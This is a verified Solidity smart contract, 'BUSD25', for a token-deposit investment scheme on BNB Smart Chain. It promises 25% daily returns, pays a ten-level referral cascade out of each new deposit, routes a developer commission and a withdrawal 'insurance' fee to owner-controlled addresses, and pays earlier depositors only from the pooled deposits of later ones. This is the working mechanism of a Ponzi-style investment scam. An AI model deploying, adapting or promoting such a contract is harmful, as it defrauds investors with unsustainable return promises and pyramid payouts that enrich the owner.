/**
 *Submitted for verification at BscScan.com on 2022-08-26
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

/**
 *Submitted for verification at BscScan.com on 2021-04-08
*/

pragma solidity ^0.4.25;

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BUSD25 {

    using SafeMath for uint256;

    uint256 constant public interestRateDivisor = 1000000000000;
    uint256 constant public devCommission = 10;
    uint256 constant public commissionDivisor = 100;
    uint256 constant public secRate = 2893564; //DAILY 25%

    uint256 public minDepositSize;
    uint256 public releaseTime;
    uint256 public totalPlayers;
    uint256 public totalPayout;
    uint256 public totalInvested;

    uint256 public Contract;
    address public sourceToken;

    address owner;
    address insurance;

    struct Player {
        uint256 depositAmount;
        uint256 time;
        uint256 interestProfit;
        uint256 affRewards;
        uint256 payoutSum;
        address affFrom;
    }

    mapping(address => Player) public players;
    mapping(address => uint256[10]) public affSums;

    uint256 [] affRate;

    event NewDeposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor(uint256 _releaseTime, address _insurance, uint256 _minDeposit, IERC20 _sourceToken) public {
      owner = msg.sender;
      releaseTime = _releaseTime;
      insurance = _insurance;
      minDepositSize = _minDeposit;
      sourceToken = _sourceToken;

      affRate.push(5);
      affRate.push(4);
      affRate.push(3);
      affRate.push(2);
      affRate.push(2);
      affRate.push(2);
      affRate.push(2);
      affRate.push(2);
      affRate.push(2);
      affRate.push(2);
    }


    function register(address _addr, address _affAddr) private {

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      for(uint256 i = 0; i < affRate.length; i++){
        affSums[_affAddr][i] = affSums[_affAddr][i].add(1);
        _affAddr = players[_affAddr].affFrom;
      }

    }

    function deposit(address _affAddr, uint256 amount) public {
        require(now >= releaseTime, "not start yet!");
        collect(msg.sender);
        require(amount >= minDepositSize);
        IERC20(sourceToken).transferFrom(msg.sender,address(this), amount);

        Player storage player = players[msg.sender];

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].depositAmount > 0){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }
        player.depositAmount = player.depositAmount.add(amount);

        distributeRef(amount, player.affFrom);

        totalInvested = totalInvested.add(amount);
        uint256 devEarn = amount.mul(devCommission).div(commissionDivisor);
        Contract = Contract.add(devEarn);

        emit NewDeposit(msg.sender, amount);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(contractBalance() >= depositAmount);
      player.interestProfit = 0;
      player.depositAmount = player.depositAmount.add(depositAmount);
    }


    function collect(address _addr) private {
        Player storage player = players[_addr];

        uint256 secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint256 collectProfit = (player.depositAmount.mul(secPassed.mul(secRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint256 _amount) private {
        if (_amount > 0 && _receiver != address(0)) {
            if (contractBalance() > 0) {
                uint256 payout = _amount > contractBalance() ? contractBalance() : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                emit Withdraw(msg.sender, payout);

                uint256 insuranceFee = payout.mul(10).div(100); // 10%
                payout = payout.sub(insuranceFee);

                IERC20(sourceToken).transfer(msg.sender, payout);
                IERC20(sourceToken).transfer(insurance, insuranceFee);
            }
        }
    }

    function distributeRef(uint256 _bnb, address _affFrom) private{

        uint256 _allaff = (_bnb.mul(26)).div(100);
        address affAddr = _affFrom;
        for(uint i = 0; i < affRate.length; i++){
          uint256 _affRewards = (_bnb.mul(affRate[i])).div(100);
          _allaff = _allaff.sub(_affRewards);
          players[affAddr].affRewards = _affRewards.add(players[affAddr].affRewards);
          IERC20(sourceToken).transfer(affAddr, _affRewards);
          affAddr = players[affAddr].affFrom;
        }

        if(_allaff > 0 ){
            IERC20(sourceToken).transfer(owner, _allaff);
        }
    }

    function getProfit(address _addr) public view returns (uint256) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      if(player.time == 0){
          return 0;
      }

      uint256 secPassed = now.sub(player.time);
      if (secPassed > 0) {
          uint256 collectProfit = (player.depositAmount.mul(secPassed.mul(secRate))).div(interestRateDivisor);
      }
      return collectProfit.add(player.interestProfit);
    }

    function getAffSums(address _addr) public view returns ( uint256[] memory data, uint256 totalAff) {
      uint256[] memory _affSums = new uint256[](10);
      uint256 total;
      for(uint8 i = 0; i < 10; i++) {
          _affSums[i] = affSums[_addr][i];
          total = total.add(_affSums[i]);
      }
      return (_affSums, total);
    }

    function contractBalance() public view returns(uint256){
        uint256 balance = IERC20(sourceToken).balanceOf(address(this));
        balance = balance.sub(Contract);

        return balance;
    }

    function claimDevIncome(address _addr, uint256 _amount) public returns(address to, uint256 value){
      require(msg.sender == owner, "unauthorized call");
      require(_amount <= Contract, "invalid amount");
      uint256 currentBalance = IERC20(sourceToken).balanceOf(address(this));

      if(currentBalance < _amount){
        _amount = currentBalance;
      }

      Contract = Contract.sub(_amount);

      IERC20(sourceToken).transfer(_addr, _amount);

      return(_addr, _amount);
    }

    function updateStarttime(uint256 _releaseTime) public returns(bool){
      require(msg.sender == owner, "unauthorized call");
      releaseTime = _releaseTime;
      return true;
    }
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "invliad mul");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "invliad div");
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "invliad sub");
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "invliad +");

        return c;
    }

}